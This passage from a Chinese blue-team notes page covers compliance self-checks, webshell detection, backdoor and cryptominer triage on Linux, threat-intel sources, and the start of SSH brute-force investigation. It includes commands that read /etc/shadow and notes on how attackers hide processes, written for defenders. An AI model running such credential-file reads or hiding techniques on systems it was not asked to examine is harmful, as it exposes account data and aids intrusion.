access.log |awk ‘{print $7}’ |grep &#x2F;%25Domain |sort|uniq - c |sort -rn|more</p><h1 id="等保测评"><a href="#等保测评" class="headerlink" title="等保测评"></a>等保测评</h1><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&mid=2247484756&idx=1&sn=cd4436a0f114fee55edee95c812936af&chksm=c27ca7baf50b2eacb4e16a292be7e1833c94a5011d1e07f4f9856aa983bfa36ba1433a489b79&cur_album_id=3116830588591980546&scene=189#wechat_redirect">学习干货|等保测评2.0技术自查阶段(中) (qq.com)</a></p></blockquote><h2 id="windwos"><a href="#windwos" class="headerlink" title="windwos"></a>windwos</h2><p>lusrmgr.msc：用户账号与组设置，密码过期</p><p>secpol.msc：用户权限，登陆限制，密码设置策略，审计功能开启</p><p>netplwiz：设置“必须输入密码”</p><p>eventvwr.msc：审计日志</p><p>dconcnfg：组件</p><p>firewall.cpl：waf</p><p>appwiz.cpl：程序功能，补丁</p><p>services.msc:服务</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>用户身份&#x2F;etc&#x2F;shadow</p><p><img src="E:\blog\source_posts\蓝队笔记\image-20240707113633366.png" alt="image-20240707113633366"></p><p>登录控制</p><ul><li>linux &#x2F;etc&#x2F;login.defs </li><li>ubuntu &#x2F;etc&#x2F;pam.d&#x2F;common-password</li><li>centos &#x2F;etc&#x2F;pam.d&#x2F;system-auth</li></ul><p>文件权限分配</p><p>r-4 w-2 x-1 配置文件不超过644 可执行不超过755</p><p>远程登录</p><p>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>用户权限</p><p>&#x2F;etc&#x2F;sudoers</p><p>安全审计</p><p>systemctl status rsyslog(auditd)</p><p>日志工具</p><p>&#x2F;var&#x2F;log&#x2F;syslog</p><p>&#x2F;vatr&#x2F;log&#x2F;audit&#x2F;audit.log</p><p>入侵防范</p><p>uanme -a</p><p>apt-get update</p><h1 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h1><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>首先，通过浏览器以 HTTP 协议访问 Web Server 上的一个 CGI 文件，是一个合法的 TCP 连接，TCP&#x2F;IP 的应用层之下没有任何特征，只能在<strong>应用层进行检测</strong>。<br>黑客不管是传文件还是改文件，必然有一个文件会包含 webshell 代码，很容易想到从文件代码入手，这是<strong>静态特征检测</strong>。<br>webshell 运行后，B&#x2F;S 数据通过 HTTP 交互，HTTP 请求&#x2F;响应中可以找到蛛丝马迹，这是<strong>动态特征检测</strong>。</p><p>【静态检测】</p><p>静态检测通过匹配特征码，特征值，危险函数函数来查找 webshell 的方法。</p><p>优点是快速方便，对已知的 webshell 查找准确率高，部署方便。</p><p>缺点漏报率、误报率高，无法查找 0day 型 webshell，而且容易被绕过。</p><p>【静态检测配合人工】<br>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>【动态检测】</p><p>Linux 下就是 nobody 用户起了 bash，Win 下就是 IIS User 启动 cmd，这些都是动态特征。</p><p>如果黑客反向连接的话，那很更容易检测了，Agent 和 IDS 都可以抓现行。</p><p>Webshell 总有一个 HTTP 请求，如果我在网络层监控 HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了 200，则很容易定位到 webshell，这便是 http 异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p><p>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p><p>【日志检测】</p><p>使用 Webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 Webshell 页</p><p>面的访问数据和数据提交记录。</p><p>日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP 异常请求模型检测</p><p>【寻找 webshell】<br>1.自动化查找：D 盾 河马 fotify<br>2.手动查找：windows sublime 全文件夹查找 IDE PHPSTORM 全局查找<br>Linux 命令查找 <code>grep -rn &quot;eval(&quot; *</code><br>webshell 特征 PHP 的危险函数<br>还有 <code>phar &lt;?php XXXXX</code></p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>1.限制上传的文件夹解析方式</p><p>2.匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。</p><p>3.给予上传的文件夹二级域名并且不给予解析权限</p><p>4.只能局域网访问</p><h1 id="问题处置-1"><a href="#问题处置-1" class="headerlink" title="问题处置"></a>问题处置</h1><h2 id="文件无法删除"><a href="#文件无法删除" class="headerlink" title="文件无法删除"></a><strong>文件无法删除</strong></h2><h3 id="进程占用"><a href="#进程占用" class="headerlink" title="进程占用"></a><strong>进程占用</strong></h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">lsof</span> xxxx.xx<br></code></pre></td></tr></table></figure><h3 id="隐藏属性"><a href="#隐藏属性" class="headerlink" title="隐藏属性"></a><strong>隐藏属性</strong></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sattr xxxx<span class="hljs-selector-class">.xx</span><br>chattr -<span class="hljs-selector-tag">a</span> xxxx<span class="hljs-selector-class">.xx</span><br>chattr -<span class="hljs-selector-tag">i</span> xxxx.xx<br></code></pre></td></tr></table></figure><h3 id="上层文件存在-SBIT-权限"><a href="#上层文件存在-SBIT-权限" class="headerlink" title="上层文件存在 SBIT 权限"></a><strong>上层文件存在 SBIT 权限</strong></h3><p>这种情况只存在于非 root 权限去删除其他用户创建的目录的情况，即使文件权限是 777 也无法进行删除。<br>当目录被设置了粘滞位权限以后，即便用户对该目录有写入权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和 root 用户才有权将其删除。<br>这种办法可以保持一种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。<br>需要注意的是，粘滞位权限只能针对目录设置，对于文件无效。<br>设置了粘滞位权限的目录，使用 ls 命令查看其属性时，其他用户权限处的“x”将变为“t”。<br>粘滞位权限都是针对其他用户设置，使用 chmod 命令设置目录权限时，“o+t”、“o-t”权限模式可分别用于添加、移除粘滞位权限。</p><h2 id="netstat-pantu-不显示-pid-而显示"><a href="#netstat-pantu-不显示-pid-而显示" class="headerlink" title="netstat -pantu 不显示 pid 而显示 -"></a><strong>netstat -pantu 不显示 pid 而显示 -</strong></h2><p>可能是使用了 <code>mkdir .hidden 或者 mount -o bind .hidden /proc/PID</code> 来隐藏</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cat <span class="hljs-string">/proc/</span>$$<span class="hljs-string">/mountinfo</span>   <span class="hljs-string">//</span>查询挂载信息<br>umount <span class="hljs-string">/proc/PID</span>   <span class="hljs-string">//</span>取消挂载<br></code></pre></td></tr></table></figure><h2 id="ps-和-top-看不到恶意进程"><a href="#ps-和-top-看不到恶意进程" class="headerlink" title="ps 和 top 看不到恶意进程"></a><strong>ps 和 top 看不到恶意进程</strong></h2><ol><li>挂载被隐藏（看上一个的操作）</li><li>命令被替换（使用 busybox 进行检修）</li><li>LD_PRELOAD 等方法共享库劫持（使用 busybox 进行检修）</li></ol><h2 id="快速查找文件"><a href="#快速查找文件" class="headerlink" title="快速查找文件"></a><strong>快速查找文件</strong></h2><p>【which】<br>从环境变量查找系统命令的具体文件位置<br>【whereis】<br>从&#x2F;usr 目录快速查找文件<br>【locate】<br>从 locatedb 数据库查找文件路径<br>【find】<br>强大的搜索命令<br><code>find &lt;检索路径&gt; &lt;选项&gt; &lt;搜索内容&gt;</code><br><a href="https://cloud.tencent.com/developer/article/1348438">具体使用方法</a></p><h2 id="确定系统信息"><a href="#确定系统信息" class="headerlink" title="确定系统信息"></a><strong>确定系统信息</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue   <span class="hljs-regexp">//</span>系统版本<br>uname -m<br>getconf LONG_BIT   <span class="hljs-regexp">//</span>查看系统位数<br>cat <span class="hljs-regexp">/proc/</span>version   <span class="hljs-regexp">//</span>查看内核版本<br>uname -a<br></code></pre></td></tr></table></figure><h2 id="系统完整性检测"><a href="#系统完整性检测" class="headerlink" title="系统完整性检测"></a><strong>系统完整性检测</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Va   <span class="hljs-regexp">//</span>Centos<br>apt install debsums   <span class="hljs-regexp">//</span>Ubuntu、Debian<br>debsums --all --changed<br></code></pre></td></tr></table></figure><h2 id="系统文件监控工具"><a href="#系统文件监控工具" class="headerlink" title="系统文件监控工具"></a><strong>系统文件监控工具</strong></h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">AIDE<span class="hljs-string">\inotify\tripwire</span><br></code></pre></td></tr></table></figure><h2 id="查看-glibc-版本"><a href="#查看-glibc-版本" class="headerlink" title="查看 glibc 版本"></a><strong>查看 glibc 版本</strong></h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ldd <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h2 id="误删文件恢复"><a href="#误删文件恢复" class="headerlink" title="误删文件恢复"></a><strong>误删文件恢复</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">被删除的文件在进程的内存空间还保存着一份，可以通过访问某个目录来找到文件恢复<br>如果正在进行读写操作：<br>lsof   <span class="hljs-regexp">//</span>查找进程文件恢复即可<br>mount   <span class="hljs-regexp">//</span>查看所有挂载点<br>umount   <span class="hljs-regexp">//</span>删除挂载点<br>lsblk -f   <span class="hljs-regexp">//</span>查看所有设备的挂载情况<br>df -T 路径   <span class="hljs-regexp">//</span>可查看该路径的所属挂载点、所在分区、所在分区的文件系统类型<br>cat <span class="hljs-regexp">/proc/</span>filesystems   <span class="hljs-regexp">//</span>查看文件系统的类型<br>常用恢复工具有：Extundelete、Debugfs、R-Linux、Ext3grep、Ext4magic<br></code></pre></td></tr></table></figure><h2 id="批量检索文件并打印信息"><a href="#批量检索文件并打印信息" class="headerlink" title="批量检索文件并打印信息"></a><strong>批量检索文件并打印信息</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;内容&quot;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> [ -f <span class="hljs-variable">$line</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">ls</span> -al <span class="hljs-variable">$line</span>; <span class="hljs-keyword">elif</span> [ -d <span class="hljs-variable">$line</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">ls</span> -al ../ | grep <span class="hljs-variable">$line</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="拷贝取证"><a href="#拷贝取证" class="headerlink" title="拷贝取证"></a><strong>拷贝取证</strong></h2><ol><li>使用虚拟化平台存储快照</li><li>打包整个系统</li><li>全盘拷贝（推荐 clonezilla）</li><li>进程拷贝（推荐 CRIU）</li><li>组合运用（冻结进程 + 全盘拷贝 + 恢复进程）</li></ol><h1 id="远控后门"><a href="#远控后门" class="headerlink" title="远控后门"></a>远控后门</h1><h2 id="获取事件告警信息"><a href="#获取事件告警信息" class="headerlink" title="获取事件告警信息"></a><strong>获取事件告警信息</strong></h2><p>监控 EDR、态势感知、防火墙等平台查看威胁告警以及日志。</p><h2 id="定位后门文件"><a href="#定位后门文件" class="headerlink" title="定位后门文件"></a><strong>定位后门文件</strong></h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">根据告警信息定位后门文件位置，查找进程pid<br>lsof | <span class="hljs-keyword">grep</span> xxxx.xx<br>lsof <span class="hljs-regexp">/root/</span>xxxx.xx<br>fuser <span class="hljs-regexp">/root/</span>xxxx.xx<br></code></pre></td></tr></table></figure><h2 id="查看外连事件详情"><a href="#查看外连事件详情" class="headerlink" title="查看外连事件详情"></a><strong>查看外连事件详情</strong></h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">根据五元组来查找通信的端口ip对应的pid<br>netstat -pantu <span class="hljs-string">| grep 114.114.114.114</span><br>netstat -pantu <span class="hljs-string">| grep 65533</span><br>lsof -i:<span class="hljs-number">65533</span><br></code></pre></td></tr></table></figure><h2 id="查找进程信息"><a href="#查找进程信息" class="headerlink" title="查找进程信息"></a><strong>查找进程信息</strong></h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tcl">查找进程相关文件<br>lsof -p <span class="hljs-number">1234</span>   （需要root权限）<br>pwdx<br>获取<span class="hljs-keyword">pid</span>程序详细信息<br>lsof -p <span class="hljs-keyword">pid</span><br>pwdx <span class="hljs-keyword">pid</span><br>systemctl status <span class="hljs-keyword">pid</span><br>cat /<span class="hljs-keyword">proc</span>/pid/maps<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -al /<span class="hljs-keyword">proc</span>/pid/exe<br></code></pre></td></tr></table></figure><h2 id="根据-pid-查看对应线程"><a href="#根据-pid-查看对应线程" class="headerlink" title="根据 pid 查看对应线程"></a><strong>根据 pid 查看对应线程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-built_in">H</span> <span class="hljs-literal">-T</span> <span class="hljs-literal">-p</span> pid<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-aLf</span> pid<br>pstree <span class="hljs-literal">-agplU</span>（推荐使用）<br></code></pre></td></tr></table></figure><h2 id="确定进程运行时间"><a href="#确定进程运行时间" class="headerlink" title="确定进程运行时间"></a><strong>确定进程运行时间</strong></h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -eo pid,lstart,etime,cmd | <span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;pid&gt;</span><br></code></pre></td></tr></table></figure><h2 id="比对恶意文件的创建时间"><a href="#比对恶意文件的创建时间" class="headerlink" title="比对恶意文件的创建时间"></a><strong>比对恶意文件的创建时间</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> xxx.xx<br><span class="hljs-built_in">ls</span> -al xxx.xx<br></code></pre></td></tr></table></figure><h2 id="样本采集分析"><a href="#样本采集分析" class="headerlink" title="样本采集分析"></a><strong>样本采集分析</strong></h2><p>使用 SCP&#x2F;Xshell 等将样本移出主机，计算哈希值后到威胁情报平台中去搜索<br>certutil -hashfile 文件 MD5</p><h2 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a><strong>进程查杀</strong></h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">【查找子进程】<br>ps ajfx<br>systemctl <span class="hljs-built_in">status</span><br>【杀死进程】<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> pid   （这样子是杀不死子进程的！！！）<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> -pid   （杀掉进程组）<br></code></pre></td></tr></table></figure><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a><strong>删除文件</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看文件占用，解除占用后删除<br>lsof xxxx.xx<br>移除 i, a 属性<br>chattr -ia file.sh<br>查看是否移除成功<br>lsattr file.sh<br>移除文件<br><span class="hljs-built_in">rm</span> -rf file.sh<br>奇怪文件名无法删除，先查inode再删除<br><span class="hljs-built_in">ls</span> -li xxxx.xx<br>find ./* -inum 12327526 -delete<br>find ./ -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -i &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; \;<br>find ./* -inum 12327526 |xargs <span class="hljs-built_in">rm</span> -f<br><span class="hljs-built_in">rm</span> <br>find ./* -inum 12327526<br>目录挂载无法删除（Device or resource busy）<br>sudo lsblk -a<br>sudo umount /dev/sdb1<br><span class="hljs-built_in">rm</span> -rf xxxx.xx<br></code></pre></td></tr></table></figure><h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><p>威胁情报的获取源</p><blockquote><p>谷歌：<a href="http://www.google.com/">www.google.com</a></p><p>百度：<a href="http://www.baidu.com/">www.baidu.com</a></p><p>Virustotal：<a href="http://www.virustotal.com/">www.virustotal.com</a></p><p>微步在线：x.threatbook.cn</p><p>腾讯哈勃：habo.qq.com</p><p>Virscan：virusscan.jotti.org</p><p>Freebuf：<a href="http://www.freebuf.com/">www.freebuf.com</a></p><p>Jotti：virusscan.jotti.org</p><p>Scandir：<a href="http://www.scandir.com/">www.scandir.com</a></p><p>Alexa排名：<a href="http://www.alexa.com/">www.alexa.com</a></p><p>备案查询：beian.cndns.com</p><p>深信服安全中心：sec.sangfor.com.cn</p><p>深信服威胁分析平台：wiki.sec.sangfor.com.cn</p><p>深信服EDR安全软件中心：edr.sangfor.com.cn</p></blockquote><p>黑客通过随机域名，动态域名，近期域名，顶级域名，暗网代理域名攻击</p><h1 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h1><ul><li><strong>蠕虫：</strong>自动复制自身的副本到其它主机的病毒。</li><li><strong>木马：</strong>隐蔽性强，多用于监控用户行为或盗取用户数据的病毒。</li><li><strong>感染型病毒：</strong>能将自身恶意代码插入正常文件的病毒。</li><li><strong>脚本病毒：</strong>使用脚本编写的病毒。</li><li><strong>宏病毒：</strong>宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。</li><li><strong>僵尸网络病毒：</strong>能形成大型的一对多，多对多控制的远程控制病毒。</li><li><strong>后门：</strong>在主机上开放端口允许远程非授权访问。</li><li><strong>挖矿病毒</strong>：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。</li><li><strong>勒索病毒</strong>：能对用户文件进行加密的病毒。</li></ul><h1 id="挖矿排查"><a href="#挖矿排查" class="headerlink" title="挖矿排查"></a>挖矿排查</h1><p><strong>获取信息</strong></p><ul><li>下线服务器之后从 DNS 服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息</li><li>根据上传来源的 IP&#x2F;域名，在威胁情报平台查询确定木马类型</li><li>获取异常进程的 pid</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl">CPU占用：<br>top -c -o %CPU<br>ps -eo pid,ppid,%mem,%cpu,cmd --<span class="hljs-keyword">sort</span>=-%cpu | head -n <span class="hljs-number">5</span><br>内存占用：<br>top -c -o %MEM<br>ps -eo pid,ppid,%mem,%cpu,cmd --<span class="hljs-keyword">sort</span>=-%mem | head -n <span class="hljs-number">5</span><br>网络占用：<br>安装后使用nethogs或者jnettop进行查询<br>根据进程名或字符串查询：<br>pidof <span class="hljs-string">&quot;name&quot;</span><br>ps -aux | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;name&quot;</span><br>ps -ef | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;name&quot;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br>pgrep -f <span class="hljs-string">&quot;name&quot;</span><br></code></pre></td></tr></table></figure><ul><li>根据 pid 查询详细信息（当查询不到时有可能是&#x2F;proc&#x2F;pid 隐藏了）</li></ul><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tcl">lsof -p <span class="hljs-keyword">pid</span><br>pwdx <span class="hljs-keyword">pid</span><br>systemctl status <span class="hljs-keyword">pid</span><br>cat /<span class="hljs-keyword">proc</span>/pid/maps<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -al /<span class="hljs-keyword">proc</span>/pid/exe<br></code></pre></td></tr></table></figure><ul><li>根据 pid 查看对应线程</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-built_in">H</span> <span class="hljs-literal">-T</span> <span class="hljs-literal">-p</span> pid<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-aLf</span> pid<br>pstree <span class="hljs-literal">-agplU</span>（推荐使用）<br></code></pre></td></tr></table></figure><ul><li>确定进程运行时间</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -eo pid,lstart,etime,cmd | <span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;pid&gt;</span><br></code></pre></td></tr></table></figure><ul><li>比对恶意文件的创建时间</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> xxx.xx<br><span class="hljs-built_in">ls</span> -al xxx.xx<br></code></pre></td></tr></table></figure><ul><li>样本采集分析</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">使用<span class="hljs-keyword">SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索</span><br><span class="hljs-keyword"></span>certutil -hashfile 文件 MD5<br></code></pre></td></tr></table></figure><ul><li>进程查杀</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">【查找子进程】<br>ps ajfx<br>systemctl <span class="hljs-built_in">status</span><br>【杀死进程】<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> pid   （这样子是杀不死子进程的！！！）<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> -pid   （杀掉进程组）<br></code></pre></td></tr></table></figure><ul><li>删除文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看文件占用，解除占用后删除</span><br>lsof xxxx.xx<br><span class="hljs-comment"># 移除 i, a 属性</span><br>chattr -ia file.sh<br><span class="hljs-comment"># 查看是否移除成功</span><br>lsattr file.sh<br><span class="hljs-comment"># 移除文件</span><br><span class="hljs-built_in">rm</span> -rf file.sh<br><span class="hljs-comment"># 奇怪文件名无法删除，先查inode再删除</span><br><span class="hljs-built_in">ls</span> -li xxxx.xx<br>find ./* -inum 12327526 -delete<br>find ./ -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -i &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; \;<br>find ./* -inum 12327526 |xargs <span class="hljs-built_in">rm</span> -f<br><span class="hljs-built_in">rm</span> `find ./* -inum 12327526`<br><span class="hljs-comment"># 目录挂载无法删除（Device or resource busy）</span><br>sudo lsblk -a<br>sudo umount /dev/sdb1<br><span class="hljs-built_in">rm</span> -rf xxxx.xx<br></code></pre></td></tr></table></figure><ul><li>网页挖矿排查</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 浏览器查看历史记录，定位到该事件点访问的页面</span><br><span class="hljs-meta"># 进入虚拟机进行访问，并限制进程只允许占用一个cpu</span><br><span class="hljs-meta"># 查看该网页的源码和网络链接调用</span><br><span class="hljs-meta"># 将浏览器缓存文件进行检测（大多数是JS）</span><br><span class="hljs-meta"># 清除浏览数据&gt;清除缓存文件</span><br><span class="hljs-meta"># 解密恶意文件查看矿池地址以及连接条件</span><br><span class="hljs-meta"># 上区块链网站溯源</span><br></code></pre></td></tr></table></figure><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>暴力破解一般针对</p><p>ssh、mysql、ftp、redis、mongodb、smtp</p><h2 id="SSH-暴力破解"><a href="#SSH-暴力破解" class="headerlink" title="SSH 暴力破解"></a><strong>SSH 暴力破解</strong></h2><ol><li>使用 <code>netstat -pantu</code> 查看网络状态，重点是 PID（当被破解时会有大量的 ESTABLISHED）</li><li>使用 <code>awk -F: &#39;&#123;if($3==0) print $1&#125;&#39; /etc/passwd</code> 查找特殊权限账号（默认 root）</li><li>查找可以使用 ssh 登录的账号</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">s=$( sudo <span class="hljs-built_in">cat</span> /etc/shadow | grep <span class="hljs-string">&#x27;^[^:]*:[^\*!]&#x27;</span> | awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>);<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$s</span>;<span class="hljs-keyword">do</span> <span class="hljs-built_in">cat</span>/etc/passwd | grep -v <span class="hljs-string">&quot;/bin/false\|/nologin&quot;</span>| grep <span class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> |awk -F: <span class="hljs-string">&#x27;&#123;print$1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><ol><li>查看正在连接的 ssh-session</li></ol><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">who -a<br>w<br><span class="hljs-keyword">last</span> -p now<br>sudo netstat -tnpa | <span class="hljs-keyword">grep</span> <span 